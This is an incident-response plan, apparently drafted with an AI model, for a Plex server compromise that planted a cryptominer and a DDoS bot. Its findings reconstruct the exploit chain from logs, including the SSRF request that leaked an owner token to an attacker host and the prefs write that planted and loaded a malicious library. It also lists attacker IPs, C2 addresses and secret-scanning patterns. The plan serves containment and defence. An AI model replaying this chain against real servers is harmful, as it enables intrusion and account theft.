---
tier: tale
title: "Athena Plex compromise: contain, eradicate, patch, verify"
goal:
  athena is free of the Plex-borne miner and bot, runs a patched Plex that is not
  internet-exposed, and Bryan holds the rotation checklist.
size: medium
decisions:
  remote_access:
    ask:
      Should Plex become reachable only over the tailnet and LAN, with internet exposure
      removed?
    choices:
      tailnet:
        Remote Access off, router mapping removed, 32400 firewalled; off-tailnet viewers
        lose access
      patched_public:
        Patched Remote Access stays on via one manual forward, UPnP off; the internet
        surface remains
    default: tailnet
    why:
      Internet-exposed 32400 was the entry point; all of Bryan's devices already use the
      tailnet
    answer: tailnet
  recovery_mode:
    ask: Should athena be cleaned in place instead of reinstalled?
    choices:
      clean:
        Keep OS, library and home; fall back to rebuild only if a root tripwire fires
      rebuild:
        Contain, preserve and report, then stop with a reinstall runbook; Plex stays off
        until rebuilt
    default: clean
    why:
      Evidence shows only uid plex was held, and Step 2 must prove no root access before
      cleaning
    answer: clean
  plex_data:
    ask:
      Should the existing Plex data directory be kept and scrubbed rather than replaced?
    choices:
      scrub:
        Keep the database and watch history; quarantine code-bearing dirs and reset
        abused prefs
      fresh:
        Quarantine all Plex data and start empty; re-claim server, re-add libraries,
        lose watch history
    default: scrub
    why:
      The payload sits in Codecs and /tmp; the database holds no code, and Step 2 sweeps
      for more
    answer: scrub
  home_perms:
    ask: Should /home/bryan stop being world-readable?
    choices:
      lock:
        Home and ~/.config become 750 and secrets 600; other users that read ~bryan
        break until fixed
      secrets_only: Home stays 755; only the identified secret files become 600
    default: lock
    why:
      The plex account could read every world-readable home file; the next breach could
      too
    answer: lock
  report:
    ask: Should the redacted incident report go in the bob-cli--research sidecar?
    choices:
      research:
        Redacted report (no binaries or tokens) in bob-cli--research; raw evidence stays
        on apollo
      local:
        Report lives only beside the off-host evidence on apollo, outside any git repo
    default: research
    why:
      The sidecar holds durable reports, and redaction keeps tokens and malware out of
      git
    answer: research
proposed_by: bbugyi200.apollo.8f
proposed_with: claude/opus
decided_by: reviewer
decided_via: tui
create_time: 2026-10-17 07:36:07
status: wip
---

# Athena Plex Compromise: Contain, Eradicate, Patch, Verify

athena (Debian 13, Bryan's home server) is running a cryptominer
(`x12345 --donate-level 5 -o ota.proxystream.st:3333 --rig-id plex`) and a DDoS-bot
implant as the `plex` user. This plan contains the incident, preserves evidence, removes
the persistence, patches the hole, verifies the fix, and leaves Bryan a short list of
actions only he can do. No bob-cli code changes are involved.

## Findings From The Read-Only Investigation (2026-10-17, times EDT)

### How it happened

Plex Media Server **1.42.2.10156** was internet-reachable at `72.76.171.141:32400`: the
router maps it through UPnP (log:
`MyPlex: mapping state set to 'Mapped - Not Published'`), and probes from apollo got
HTTP 200 on `/identity`. Plex was never upgraded because athena's Plex apt lists have
not refreshed since 2025-09-22, so apt still shows 1.42.2 as the candidate. The latest
public build is **1.43.4.10903-e5521bd8c**. Plex's September 2026 security release
(1.43.3.10861 / 1.43.3.10896) fixes the CompanionProxy issue (PM-5763), the
`/player/timeline` SSRF (CVE-2026-96652), and makes `TranscoderH264Options` no longer
settable over the network (PM-5766).

Exploit chain, from `Logs/Plex Media Server.1.log`:

| Time     | Event                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 01:24:33 | `45.194.92.222` `GET /` → 401 (recon)                                                                                                                                                                                                                                                                                                                                                                     |
| 01:48:10 | Unauthenticated guest calls `/player/proxy/poll` and registers a fake player `poc_39f7d2b06336_16090`                                                                                                                                                                                                                                                                                                     |
| 01:48:12 | `/player/timeline/subscribe` with `protocol=http://127.0.0.1:32400/system/agents/z/searchOne?...identifier=com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://127.0.0.1.45-194-92-222.sslip.io:8952/TKN_29d25513f49b_16090`; on unsubscribe, CompanionProxy POSTs to trusted loopback, and the legacy TheTVDB agent fetches the attacker URL **carrying the owner token for `bryanb87`** |
| 01:48:14 | Attacker uses that token over the WAN: `GET /:/prefs`, `GET /system/:/resources/x?resource_name=/usr/lib/plexmediaserver/Plex Transcoder`, then `PUT /:/prefs?TranscoderH264Options=dump-yuv=<Codecs>/46f74ab-560174306fe167a5978a79dd-linux-x86_64/zzdf950053.so:qp=0` and transcodes `http://45.194.92.222:8933/carrier.mp4`, so x264 writes attacker bytes to `zzdf950053.so`                          |
| 01:48:22 | A second transcode runs with `FFMPEG_EXTERNAL_LIBS=<that Codecs dir>`, loading the `.so` → code execution as `plex`; `TranscoderH264Options` is reset to empty (cleanup)                                                                                                                                                                                                                                  |
| 02:13:05 | `/tmp/x12345` (miner) dropped                                                                                                                                                                                                                                                                                                                                                                             |
| 06:15:19 | Implant `inetd` (uid 998, PPID 1, ~112 kB RSS) starts one second after a scanner job; `/tmp/libcow.so` rewritten                                                                                                                                                                                                                                                                                          |
| 07:20:17 | The old implant is gone and a **new** `inetd` (pid 3448219) starts in the same second as a scanner job; `/tmp/libcow.so` is rewritten at 07:20:18 and `/tmp/x12345` at 07:20:29                                                                                                                                                                                                                           |

**Persistence:** every Plex Media Scanner and Transcoder job runs with
`FFMPEG_EXTERNAL_LIBS` pointing at the Codecs directory and logs
`External lib has no loading function`. That means the planted `.so`'s constructor runs
on every hourly scan and every transcode. Killing the processes alone is futile; the
implant comes back within the hour. The implant runs inside
`/system.slice/plexmediaserver.service` (KillMode=control-group).

### Indicators of compromise

| Kind                                   | Value                                                                                                                                                                                  |
| -------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Attacker / payload host                | `45.194.92.222` (ports 8933, 8952; `*.45-194-92-222.sslip.io`)                                                                                                                         |
| Bot C2 (live ESTAB from 192.168.1.156) | `178.16.53.68:52869`                                                                                                                                                                   |
| Mining pool                            | `ota.proxystream.st` → `217.60.194.116:3333`                                                                                                                                           |
| Codec payload                          | `.../Plex Media Server/Codecs/46f74ab-560174306fe167a5978a79dd-linux-x86_64/zzdf950053.so` sha256 `a09825f788cded5491b46effecbb9adef8531aba98a78d63a114a246631c588c`                   |
| Miner                                  | `/tmp/x12345` (static x86-64 ELF, mode 777) sha256 `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` (07:20 rewrite: hash again)                                      |
| DDoS bot                               | `/tmp/libcow.so`, actually an i386 static ELF with Mirai/Gafgyt-style `TSource Engine` strings, sha256 `4a0d4381947ca7d2658a67967686fcc5b7e2041394542f975422c66d1a932838` (hash again) |
| Process                                | `inetd` running as uid 998 `plex` with PPID 1                                                                                                                                          |

### Blast radius known so far

- The attacker ran as `plex` (`/usr/sbin/nologin`; groups plex, video, render,
  debian-transmission). Bryan's `sudo` needs a password. There is no
  `/etc/ld.so.preload` and no changes since 01:40 under `/etc`, `/usr/lib/systemd`,
  `/usr/local`, `/usr/sbin`, or `/opt` visible to bryan (except
  `/opt/piavpn/etc/data.json`). Tailscale SSH (`RunSSH`) is off on athena and apollo.
- `~/.ssh` and `~/.sase` are 700. But `/home/bryan` is 755 and `~/.config` is 775, so
  the attacker could read every world-readable file: for example `~/actual/.env`,
  `~/.claude.json`, and `~/db/home/.task/private.key.pem`.
- The exfiltrated `bryanb87` token is account-level; treat the Plex account as
  compromised.
- The miner was not running at 07:12 or 07:25, but load averages (72 → 24) show it ran
  until roughly 07:00. Read-only `find` sweeps owned by bryan (from sshd sessions at
  07:07 and 07:09) belong to another investigator, not the attacker. Leave them alone.

## Operating Rules

- Run athena commands as `ssh athena '<cmd>'` unless `hostname` already prints `athena`.
  Run "external" probes from apollo (`ssh apollo-do` if you are not on apollo). Apollo
  is outside the home network.
- Run **every privileged step through `/sase_sudo` with `"machine": "athena"`**. Never
  use raw sudo or the docker group as a root shortcut. Batch each gate below into one
  `sase sudo request`. The request ends your turn; its `next.prompt` must name the plan
  step to resume and carry the facts the successor needs (current PIDs, file paths,
  chosen decisions).
- Before each gate, recompute live facts without root (PIDs change: 3040180 became
  3448219). Copy scripts that run as root into the root-only evidence directory first
  (`install -m 700 -o root -g root`), so a bryan-writable path is never executed as
  root.
- Never print secrets. Process `environ` contains `X_PLEX_TOKEN`; `Preferences.xml`
  holds `PlexOnlineToken`; `.LocalAdminToken` and `.env` files are secrets. Write them
  only to root-only files, redact `X-Plex-Token=`/`X_PLEX_TOKEN=`/`PlexOnlineToken=`
  values with `sed` before any copy you will read, and use `"output_to_agent": "none"`
  for commands whose stdout could carry them.
- Never execute, `chmod +x`, or unpack-and-run a sample. Handle samples only with
  `file`, `sha256sum`, and `strings`. Quarantine with `mv` plus `chmod 000`; do not `rm`
  until the evidence tarball is sealed.
- Do not reboot athena before Gate A finishes. Volatile evidence lives in `/proc`, and
  Plex stays enabled until then.
- Gather Bryan-only actions (Plex account, router) into one `/sase_questions` handoff in
  Step 5.

## Step 1 — Gate A: Contain And Capture (run first, as fast as possible)

Without root first: list `ps -u plex -o pid,ppid,lstart,args` and `ss -tn`, and record
every plex-uid process outside the `/usr/lib/plexmediaserver` tree (today: `inetd`, plus
`x12345` if it is running). Prepare `ir_capture.sh`, which for each suspect PID writes
to `/root/ir-athena-20261017/proc/<pid>/`: `ls -l exe`, a copy of `/proc/<pid>/exe` to
`exe.bin` (works even if the file was deleted), `cmdline`, `status`, `maps`, `ls -l fd`,
`cgroup`, and `environ` (secret, root-only). Then submit one gate, in this order:

1. `mkdir -m 700 /root/ir-athena-20261017` and install `ir_capture.sh` into it.
2. `kill -STOP` every suspect PID (freezes them without losing state; the bot stops
   talking to C2).
3. Run `ir_capture.sh`. Also capture `ps auxfww`, `ss -tanup` (as root it shows plex
   owners), and `nft list ruleset` to files.
4. Temporary egress block (runtime only): an `inet ir_block` table with an output-hook
   chain that drops `ip daddr { 178.16.53.68, 45.194.92.222, 217.60.194.116 }` and
   `tcp dport 3333`.
5. `systemctl disable --now plexmediaserver`. This closes the internet-facing port,
   stops scanner reloads of the `.so`, and its control-group kill takes the stopped
   implant with it. Then `pkill -KILL -u plex` and confirm `ps -u plex` is empty.
6. Quarantine into `/root/ir-athena-20261017/files/` (`mv`, then `chmod 000`):
   `/tmp/x12345`, `/tmp/libcow.so`, `zzdf950053.so`, and every other plex-owned file
   newer than `2026-10-17 01:45` in `/tmp`, `/var/tmp`, `/dev/shm`. Record `sha256sum`
   first.
7. Read-only root triage, each written to `/root/ir-athena-20261017/triage/<id>.txt`:
   - `crontab -l -u plex`;
     `ls -la /var/spool/cron/crontabs /var/spool/cron/atjobs /etc/cron.*`; `atq`.
   - Plex-owned files changed since the exploit:
     `find / -xdev \( -path /proc -o -path /sys -o -path "<PMS>/Metadata" -o -path "<PMS>/Media" -o -path "<PMS>/Cache/PhotoTranscoder" \) -prune -o -user plex -newermt "2026-10-17 01:45" -print`.
     Do the same for `/mnt/hercules` with `-type f` (plex can write media). Use
     `timeout_seconds` around 1800.
   - Changed system files:
     `find /etc /usr /opt /boot /root /var/lib /home -xdev -newermt "2026-10-17 01:45" -type f`,
     excluding `/var/lib/plexmediaserver`, `/home/bryan/.local/state`,
     `/home/bryan/.sase`, and `/home/bryan/.cache` (noisy, owned by bryan).
   - `find / -xdev -perm /6000 -type f -newermt 2026-09-01`.
   - `dpkg --verify` (mismatches only; long timeout).
   - `stat` (mtime only, never contents) of `/etc/passwd`, `/etc/shadow`, `/etc/group`,
     `/etc/sudoers`, and `/etc/sudoers.d/*`;
     `grep -n plex /etc/group /etc/sudoers /etc/sudoers.d/*`.
   - `stat` of every `authorized_keys*` file on `/` (including `/root/.ssh`).
   - `systemctl list-units --all --type=service,timer --no-pager`; `lsmod`;
     `cat /etc/ld.so.preload`; `journalctl -k --since "2026-10-17 01:40"`.
   - `journalctl --since "2026-10-17 01:40" -u plexmediaserver` (payload stdout/stderr
     may land here; redact before reading).
   - `journalctl --since "2026-10-17 01:40"` for `sudo`, `su`, `pkexec`, `polkitd`, and
     `ssh`. Also `wtmpdb last` if present (`last` is not installed).
   - `ls -l /etc/transmission-daemon/settings.json` and
     `grep -nE "script-torrent|rpc-(enabled|bind|whitelist)"` on it (no password lines).
8. Seal: `tar -czf /root/ir-athena-20261017-evidence.tgz -C /root ir-athena-20261017`,
   `sha256sum` it into a manifest, then `install -m 600 -o bryan` a copy of the tarball.
   Also copy a **redacted** text-only triage subset (no `environ`, no samples) into
   `~/ir-athena-20261017/` on athena (mode 700, owned by bryan).

`next.prompt`: resume at Step 2 with the suspect PIDs, quarantine paths, and sha256s.

## Step 2 — Analyze Without Root And Decide Clean Or Rebuild

- Copy the evidence tarball and manifest off-host to apollo at
  `~/incidents/athena-20261017/` (dir 700, files 600). Never extract or run it there.
- Fingerprint every captured `exe.bin` and quarantined file (`file`, `sha256sum`,
  `strings | head`), and compare with the IOC table.
- Classify every path from the plex-owned sweep as expected (Logs, Cache, database,
  Metadata, Preferences) or **suspect**: anything code-bearing under `Codecs`,
  `Plug-ins`, `Plug-in Support`, `Scanners`, `Drivers`, or `Updates`; any `.so`, `.py`,
  ELF, or script; anything outside the Plex tree and `/tmp`.
- **Root-compromise tripwires.** Any hit means stop and recommend a rebuild, whatever
  `recovery_mode` says. Tell Bryan which tripwire fired. `dpkg --verify` reporting
  changed non-conffile binaries or libraries; new SUID/SGID files; changed
  `authorized_keys`, cron, at, or systemd entries Bryan did not author; sudo, su, or
  pkexec use by plex; kernel module loads or oopses after 01:48; root-owned artifacts
  tied to the payload; any root process whose exe is under `/tmp`, `/var/tmp`,
  `/dev/shm`, or deleted.

> [!decision] recovery_mode = rebuild After Step 2, skip Steps 3-4. Keep
> `plexmediaserver` disabled and the `ir_block` table in place, and write a reinstall
> runbook into the report. The runbook covers data to carry over (media under
> `/mnt/hercules`; the Plex database only after the Step 2 review; the home directory
> without executables or dotfile-managed binaries) and the order: patched Plex first,
> tailnet-only. Then do Step 5's account and secret rotation and Step 6's report.

## Step 3 — Gate B: Eradicate And Patch

Without root first:

- Fetch `https://plex.tv/api/downloads/5.json` and select the Linux `debian`
  `linux-x86_64` release. When this plan was written it was `1.43.4.10903-e5521bd8c`
  with SHA1 `15b047e6eae77bbbc61573ae8bf728fdcc0e40f5`. The required minimum is
  **1.43.3.10896**. Download the `.deb` on athena into `~/ir-athena-20261017/pkg/` and
  verify that `sha1sum` matches the API checksum.
- Write `plex_prefs.py` (run with `python3 -I`, using `xml.etree`). It backs up
  `Preferences.xml` into the evidence directory and clears `TranscoderH264Options` and
  `TranscoderH264OptionsOverride`. Under `remote_access = tailnet` it also sets
  `PublishServerOnPlexOnlineKey="0"` (Remote Access off) and
  `ManualPortMappingMode="0"`. It prints only the names of changed attributes. A
  `--check` mode prints booleans only.
- Under `remote_access = tailnet`, write `/etc/nftables-plex-guard.nft`: an idempotent
  `table inet plex_guard` with an input-hook chain that accepts TCP 32400 from
  `iifname lo`, `iifname tailscale0`, and `ip saddr 192.168.1.0/24`, and drops TCP 32400
  from everything else, IPv6 included. Pair it with a `plex-guard.service` oneshot
  (`Before=plexmediaserver.service`, `WantedBy=multi-user.target`) that loads it with
  `nft -f`. Never use `flush ruleset`; Docker and PIA own other tables.

Gate B, in order:

1. `apt-get update`, saving its output. A signature or key error for `downloads.plex.tv`
   explains the stale lists; record it for the follow-up below.
2. `apt-get install -y <verified .deb path>` plus `miniupnpc`.
3. Quarantine code-bearing Plex data into the evidence directory (`mv`, `chmod 000`):
   the whole `Codecs/` directory (Plex re-downloads signed codecs), `Crash Reports/`,
   `Cache/Transcode/`, `Updates/`, and every Step 2 suspect path. Also quarantine any
   bundle under the data dir's `Plug-ins/` that is not in Plex's own
   `/usr/lib/plexmediaserver/Resources/Plug-ins-*`. Run `plex_prefs.py` on
   `Preferences.xml`.
4. Under `remote_access = tailnet`: install the nft file and unit, then
   `systemctl enable --now plex-guard.service`.
5. Only if Step 2 showed `/etc/transmission-daemon/settings.json` writable by
   debian-transmission group members, or a `script-torrent-done` hook Bryan did not set:
   tighten its mode, clear the hook, and `gpasswd -d plex debian-transmission`.
6. `systemctl enable --now plexmediaserver`, then run `plex_prefs.py --check`.

> [!decision] plex_data = fresh In Gate B step 3, quarantine the entire
> `/var/lib/plexmediaserver/Library` instead, and skip `plex_prefs.py` (a fresh install
> starts with defaults). After start, Bryan claims the server over the tailnet at
> `http://athena:32400/web`, turns Remote Access off there (under `tailnet`), and
> re-adds the `/mnt/hercules/plex` libraries.

> [!decision] remote_access = patched_public Skip the nft guard and the Remote Access
> change. In Step 5, Bryan replaces UPnP with one manual router forward to 32400. Step
> 4's external probe must then show the **patched** version instead of failing.

`next.prompt`: resume at Step 4.

## Step 4 — Verify

- `dpkg-query -W plexmediaserver` reports ≥ 1.43.3.10896; `plex_prefs.py --check`
  passes.
- External (from apollo): `curl -m8 -sk https://72.76.171.141:32400/identity` and the
  `http://` form time out or are refused. Do the same against athena's global IPv6
  addresses if apollo has IPv6. Run `nmap -Pn --top-ports 1000 72.76.171.141` if nmap
  exists, else a `/dev/tcp` loop over common ports, and report any other open ports.
- On athena run `upnpc -l`: delete Plex's mapping (`upnpc -d <ext port> TCP`) and list
  any other mappings for Bryan.
- Over the tailnet from apollo, `curl -s http://athena:32400/identity` works, and so
  does localhost on athena.
- Once Plex re-downloads codecs, the new Codecs directory holds only Plex-named
  libraries (`lib*_decoder.so`, `lib*_encoder.so`) and no `zz*.so`. Record their
  sha256s.
- No plex-uid process outside `/usr/lib/plexmediaserver`; no plex-owned files in `/tmp`,
  `/var/tmp`, or `/dev/shm` newer than the restart; no sockets to the IOC addresses or
  port 3333.
- Then use `/sase_monitor` to sleep about 75 minutes, which covers at least one hourly
  scanner cycle. Re-run the process, file, and socket checks, and confirm that no
  scanner log written after the restart contains `External lib has no loading function`.
  If anything respawned, go back to Step 2 and treat it as a rebuild tripwire.

## Step 5 — Credentials, Exposure, And Hardening

- **Exposed-secret sweep** (without root, paths only, never values): world-readable
  files in `/home/bryan` that match secret-like names (`.env*`, `*token*`, `*secret*`,
  `*.pem`, `*.key`, `auth.json`, `.netrc`, `.git-credentials`, `.pgpass`, `rclone.conf`,
  `*.kdbx`) or whose content `grep -lE` matches private-key headers or `ghp_`,
  `github_pat_`, `sk-`, `xox[bap]-`, `AKIA`, or `api[_-]?key`. Skip bulky caches and
  toolchains.
- `home_perms = lock`: first check for system services or users other than bryan that
  read under `/home/bryan` (systemd units whose `User=` is not bryan, web servers). Then
  `chmod 750 /home/bryan ~/.config` and `chmod 600` each identified secret file.
  `secrets_only`: only the `chmod 600` part.
- **Lateral movement:** on apollo, review sshd auth logs since 2026-10-17 01:45 for
  logins from `100.87.31.114`, `192.168.1.156`, or `72.76.171.141` that do not match
  Bryan's or SASE's normal pattern. The risk is low: keys sit in a 700 directory and
  Tailscale SSH is off.
- **One `/sase_questions` handoff to Bryan** with this checklist; get confirmation of
  each:
  1. Plex account `bryanb87`: change the password, **sign out all devices** (this voids
     the stolen token), enable 2FA, and review authorized devices (look for `poc_*` or
     unknown ones), friends, shares, and the account email. Then sign the server back in
     over the tailnet if it lost its claim.
  2. Router `192.168.1.1`: turn UPnP off (or at least delete the Plex mapping), review
     port forwards and inbound IPv6 rules, and look for other unknown mappings.
  3. Rotate the world-readable secrets the sweep found. Already known: `~/actual/.env`
     values, any keys or OAuth held in `~/.claude.json`, and
     `~/db/home/.task/private.key.pem`.
- Fix the stale Plex apt source (e.g. refresh the signing key per Plex's current Linux
  repository instructions, looked up at run time) in a final small gate. Confirm with
  `apt-get update` and `apt-cache policy plexmediaserver` that future patches arrive.

## Step 6 — Report And Follow-Ups

- Write the incident report: timeline, root cause, IOCs with final hashes, every action
  and gate outcome, verification results, and open Bryan actions. Redact all tokens and
  never include binaries.
- `report = research`: write it into the `bob-cli--research` sidecar through
  `/sase_repo`, following that repo's conventions. `local`: put it in
  `~/incidents/athena-20261017/` on apollo.
- Through `/sase_new_task`, propose (not implement) follow-ups: a Prometheus alert for
  sustained CPU from unexpected processes or service accounts (node exporter already
  runs on athena), and automatic Plex updates.

## Acceptance

- No attacker process, file, or socket on athena after a full scanner cycle; the planted
  `.so`, miner, and bot are quarantined with hashes in a sealed tarball held off-host.
- Plex ≥ 1.43.3.10896 is running with the abused prefs cleared. Under `tailnet`, port
  32400 is unreachable from the internet (IPv4 and IPv6) but works over the tailnet and
  LAN.
- Root-compromise tripwires were evaluated and reported. A hit produced a rebuild
  recommendation instead of a "clean" verdict.
- Bryan has the Plex-account, router, and secret-rotation checklist, and the report
  exists where `report` says.
